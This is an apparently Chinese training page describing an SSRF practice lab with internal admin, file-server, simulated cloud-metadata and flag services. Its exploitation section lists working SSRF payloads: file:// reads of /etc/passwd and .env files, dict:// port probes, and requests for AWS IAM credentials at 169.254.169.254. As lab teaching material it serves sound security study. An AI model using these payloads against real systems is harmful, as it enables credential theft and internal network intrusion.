<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF内网靶机 - 朝闻道</title>
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/all.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <script src="../assets/js/mermaid.min.js"></script>
    <script>mermaid.initialize({startOnLoad: true});</script>
    <style>
        .target-card {
            border: 1px solid #dee2e6;
            border-radius: 0.75rem;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        .target-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }
        .target-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 1.5rem;
        }
        .target-body {
            padding: 1.5rem;
        }
        .service-item {
            border-left: 4px solid #667eea;
            padding-left: 1rem;
            margin-bottom: 1rem;
        }
        .service-item h4 {
            color: #667eea;
        }
        .exploit-code {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 0.25rem;
            padding: 1rem;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
        }
        .port-badge {
            background: #667eea;
            color: white;
            padding: 0.25rem 0.5rem;
            border-radius: 1rem;
            font-size: 0.875rem;
        }
    </style>
</head>
<body>
    <div class="container mt-4">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item"><a href="../index.php">首页</a></li>
                <li class="breadcrumb-item"><a href="index.php">SSRF漏洞</a></li>
                <li class="breadcrumb-item active" aria-current="page">SSRF内网靶机</li>
            </ol>
        </nav>

        <div class="row">
            <div class="col-md-8">
                <div class="card mb-4">
                    <div class="card-header">
                        <h2 class="card-title">🔄 SSRF内网靶机</h2>
                    </div>
                    <div class="card-body">
                        <h3>🎯 靶机简介</h3>
                        <p class="lead">SSRF内网靶机是一个模拟内网服务和云服务数据获取场景的环境，用于练习SSRF漏洞的利用和防御。</p>



                        <h3>🌐 服务列表</h3>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="target-card">
                                    <div class="target-header">
                                        <h4>内部管理系统</h4>
                                    </div>
                                    <div class="target-body">
                                        <div class="service-item">
                                            <h4>服务地址</h4>
                                            <p>http://localhost:10010/</p>
                                            <span class="port-badge">端口: 10010</span>
                                        </div>
                                        <div class="service-item">
                                            <h4>功能</h4>
                                            <ul>
                                                <li>系统信息</li>
                                                <li>用户信息</li>
                                                <li>敏感配置</li>
                                                <li>管理面板</li>
                                                <li>Flag获取</li>
                                            </ul>
                                        </div>
                                        <div class="service-item">
                                            <h4>访问路径</h4>
                                            <ul>
                                                <li>/ - 首页</li>
                                                <li>/?page=admin - 管理员面板</li>
                                                <li>/?page=config - 系统配置</li>
                                                <li>/?page=flag - 获取Flag</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-md-6">
                                <div class="target-card">
                                    <div class="target-header">
                                        <h4>文件服务器</h4>
                                    </div>
                                    <div class="target-body">
                                        <div class="service-item">
                                            <h4>服务地址</h4>
                                            <p>http://localhost:10013/</p>
                                            <span class="port-badge">端口: 10013</span>
                                        </div>
                                        <div class="service-item">
                                            <h4>功能</h4>
                                            <ul>
                                                <li>文件浏览</li>
                                                <li>敏感文件读取</li>
                                                <li>配置文件泄露</li>
                                                <li>Flag获取</li>
                                            </ul>
                                        </div>
                                        <div class="service-item">
                                            <h4>可访问文件</h4>
                                            <ul>
                                                <li>.env - 环境配置</li>
                                                <li>flag.txt - Flag文件</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-md-6">
                                <div class="target-card">
                                    <div class="target-header">
                                        <h4>云服务数据</h4>
                                    </div>
                                    <div class="target-body">
                                        <div class="service-item">
                                            <h4>服务地址</h4>
                                            <p>http://localhost:10010/metadata.php</p>
                                            <span class="port-badge">端口: 10010</span>
                                        </div>
                                        <div class="service-item">
                                            <h4>功能</h4>
                                            <ul>
                                                <li>AWS元数据</li>
                                                <li>阿里云元数据</li>
                                                <li>云服务凭证</li>
                                                <li>环境信息</li>
                                                <li>Flag获取</li>
                                            </ul>
                                        </div>
                                        <div class="service-item">
                                            <h4>访问路径</h4>
                                            <ul>
                                                <li>/metadata.php - 云服务数据</li>
                                                <li>模拟169.254.169.254</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-md-6">
                                <div class="target-card">
                                    <div class="target-header">
                                        <h4>Flag获取服务</h4>
                                    </div>
                                    <div class="target-body">
                                        <div class="service-item">
                                            <h4>服务地址</h4>
                                            <p>http://localhost:10010/flag.php</p>
                                            <span class="port-badge">端口: 10010</span>
                                        </div>
                                        <div class="service-item">
                                            <h4>功能</h4>
                                            <ul>
                                                <li>GET请求获取Flag</li>
                                                <li>POST请求获取Flag</li>
                                                <li>参数化Flag</li>
                                                <li>交互式测试</li>
                                                <li>多种Flag类型</li>
                                            </ul>
                                        </div>
                                        <div class="service-item">
                                            <h4>访问路径</h4>
                                            <ul>
                                                <li>/flag.php - 基础Flag</li>
                                                <li>/flag.php?type=admin - 管理员Flag</li>
                                                <li>POST请求 - 特殊Flag</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>🎯 利用示例</h3>
                        <div class="bg-light p-4 rounded mb-4">
                            <h4>1. 访问内部管理系统</h4>
                            <pre class="exploit-code"># 使用SSRF访问内部管理系统
http://target.com/ssrf.php?url=http://192.168.100.10/

# 获取Flag
http://target.com/ssrf.php?url=http://192.168.100.10/?page=flag
</pre>

                            <h4>2. 访问文件服务器</h4>
                            <pre class="exploit-code"># 读取环境配置
http://target.com/ssrf.php?url=http://192.168.100.40:8080/.env

# 读取Flag
http://target.com/ssrf.php?url=http://192.168.100.40:8080/flag.txt
</pre>

                            <h4>3. 利用file协议</h4>
                            <pre class="exploit-code"># 读取本地文件
http://target.com/ssrf.php?url=file:///etc/passwd
http://target.com/ssrf.php?url=file:///var/www/html/.env
</pre>

                            <h4>4. 利用dict协议</h4>
                            <pre class="exploit-code"># 探测端口
dict://192.168.100.10:80/INFO
dict://192.168.100.40:8080/INFO
</pre>

                            <h4>5. 访问云服务数据</h4>
                            <pre class="exploit-code"># 访问云服务元数据
http://target.com/ssrf.php?url=http://192.168.100.10/metadata.php

# 模拟AWS元数据
http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/

# 获取云服务凭证
http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
</pre>

                            <h4>6. 访问Flag获取服务</h4>
                            <pre class="exploit-code"># GET请求获取基础Flag
http://target.com/ssrf.php?url=http://192.168.100.10/flag.php

# GET请求获取管理员Flag
http://target.com/ssrf.php?url=http://192.168.100.10/flag.php?type=admin

# GET请求获取用户Flag
http://target.com/ssrf.php?url=http://192.168.100.10/flag.php?type=user&id=1001

# 使用Burp Suite发送POST请求获取Flag
POST /ssrf.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

url=http://192.168.100.10/flag.php&data=username=admin&password=admin123
</pre>
                        </div>



                        <h3>🔐 安全提示</h3>
                        <div class="alert alert-warning">
                            <strong>注意：</strong>此靶机仅用于学习和测试，请勿在生产环境中使用。启动后请确保防火墙限制外部访问，仅允许本地和内网访问。
                        </div>


                    </div>
                </div>
            </div>

            <div class="col-md-4">
                <div class="card mb-4">
                    <div class="card-header">
                        <h4>📋 靶机信息</h4>
                    </div>
                    <div class="card-body">
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item">
                                <strong>网络段:</strong> 192.168.100.0/24
                            </li>
                            <li class="list-group-item">
                                <strong>内部Web服务:</strong> 192.168.100.10:80
                            </li>
                            <li class="list-group-item">
                                <strong>文件服务器:</strong> 192.168.100.40:8080
                            </li>
                            <li class="list-group-item">
                                <strong>云服务数据:</strong> 192.168.100.10:80/metadata.php
                            </li>
                            <li class="list-group-item">
                                <strong>Flag获取服务:</strong> 192.168.100.10:80/flag.php
                            </li>
                            <li class="list-group-item">
                                <strong>宿主机端口:</strong> 10010, 10013
                            </li>
                            <li class="list-group-item">
                                <strong>容器数量:</strong> 2
                            </li>
                        </ul>
                    </div>
                </div>


            </div>
        </div>
    </div>

    <script src="../assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>
